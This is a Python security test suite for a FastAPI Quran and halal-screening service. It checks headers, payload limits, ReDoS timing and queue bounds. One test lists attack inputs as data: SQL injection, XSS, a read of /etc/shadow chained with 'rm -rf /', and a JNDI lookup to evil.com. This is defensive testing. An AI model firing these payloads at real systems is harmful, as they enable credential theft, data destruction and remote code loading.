"""
Al-Furqan AI - Comprehensive Security & Resilience Penetration Test Suite
Tests:
- Payload Bounds & Anti-OOM (422 / 413)
- Enterprise Security Headers
- Injection Attacks (SQLi, Command Injection, XSS, Null bytes)
- ReDoS (Regex Denial of Service) stress testing
- Memory Leaks & Bounded Feedback Queue
- Cryptographic SHA-256 Verification
"""

import unittest
import time
import json
from fastapi.testclient import TestClient
from server import app, engine, HalalKnowledgeBase, FEEDBACK_STORE, MAX_FEEDBACK_ITEMS

client = TestClient(app)

class TestSecurityResilience(unittest.TestCase):

    def test_01_security_headers_present(self):
        """Verify all enterprise security headers are enforced on responses."""
        resp = client.get("/api/stats")
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp.headers.get("X-Content-Type-Options"), "nosniff")
        self.assertEqual(resp.headers.get("X-Frame-Options"), "SAMEORIGIN")
        self.assertEqual(resp.headers.get("X-XSS-Protection"), "1; mode=block")
        self.assertEqual(resp.headers.get("Referrer-Policy"), "strict-origin-when-cross-origin")
        self.assertIn("camera=self", resp.headers.get("Permissions-Policy", ""))

    def test_02_oversized_payload_rejection(self):
        """Ensure payloads exceeding safe limits (>100KB) are rejected by Pydantic validation."""
        huge_text = "A" * 150000
        resp = client.post("/api/verify", json={"text": huge_text})
        self.assertEqual(resp.status_code, 422, "Oversized verify payload must be rejected with 422")

    def test_03_injection_attack_immunity(self):
        """Test resilience against SQLi, XSS, Path Traversal, and Shell Injection vectors."""
        malicious_payloads = [
            "' OR 1=1 --",
            "<script>alert('XSS')</script>",
            "../../../../etc/passwd",
            "; cat /etc/shadow && rm -rf /",
            "{{ 7 * 7 }}",
            "${jndi:ldap://evil.com/a}",
            "null\x00byte_injection",
            "يَٰٓأَيُّهَا ٱلَّذِينَ ءَامَنُواْ <iframe src='javascript:alert(1)'>",
            "'; DROP TABLE users; --"
        ]
        for payload in malicious_payloads:
            # 1. Test in Guard
            resp_guard = client.post("/api/verify", json={"text": payload})
            self.assertIn(resp_guard.status_code, [200, 400, 422])
            
            # 2. Test in Halal Screener
            resp_halal = client.post("/api/audit/contract", json={"query": payload})
            self.assertEqual(resp_halal.status_code, 200)
            
            # 3. Test in Root Verifier
            resp_root = client.post("/api/verify/root", json={"word": payload[:50], "claimed_root": payload[:20]})
            self.assertEqual(resp_root.status_code, 200)

    def test_04_redos_regex_denial_of_service(self):
        """Stress-test regex matching against pathological backtracking strings."""
        pathological_strings = [
            "E" + "1" * 10000 + "!",
            "доңыз" * 2000,
            "кредит " * 1000 + "18.5% " * 1000,
            "a" * 10000 + "@" + "b" * 10000,
            "(" * 500 + "аят" + ")" * 500
        ]
        for s in pathological_strings:
            t0 = time.perf_counter()
            matches = HalalKnowledgeBase.match_input(s)
            elapsed = time.perf_counter() - t0
            self.assertLess(elapsed, 0.25, f"ReDoS vulnerability detected! Regex took {elapsed:.4f}s on input")

    def test_05_feedback_queue_memory_bounded(self):
        """Verify feedback queue prevents memory exhaustion via bounded eviction."""
        FEEDBACK_STORE.clear()
        for i in range(1200):
            resp = client.post("/api/v1/feedback", json={
                "name": f"User_{i}",
                "email_or_phone": f"user_{i}@test.com",
                "category": "suggestion",
                "message": f"Stress test message {i}"
            })
            self.assertEqual(resp.status_code, 200)
        
        self.assertLessEqual(len(FEEDBACK_STORE), MAX_FEEDBACK_ITEMS, "Feedback store exceeded maximum memory cap")

    def test_06_live_cryptographic_integrity_seal(self):
        """Verify that SHA-256 integrity endpoint returns 64-char hex and verified status."""
        resp = client.get("/api/v1/integrity/verify")
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertEqual(data["status"], "VERIFIED_CANONICAL")
        self.assertEqual(len(data["manifest_sha256"]), 64)
        self.assertEqual(len(data["translations_sha256"]), 64)
        self.assertEqual(data["total_ayahs"], 6236)

    def test_07_invalid_coordinates_boundary(self):
        """Verify boundary coordinate enforcement for Sura/Ayah lookups."""
        invalid_coords = [(0, 1), (115, 1), (1, 0), (1, 8), (2, 287), (-1, 5)]
        for s, a in invalid_coords:
            resp = client.get(f"/api/v1/ayah/{s}/{a}")
            self.assertIn(resp.status_code, [400, 404, 422], f"Coordinate {s}:{a} should be rejected")

if __name__ == "__main__":
    unittest.main(verbosity=2)
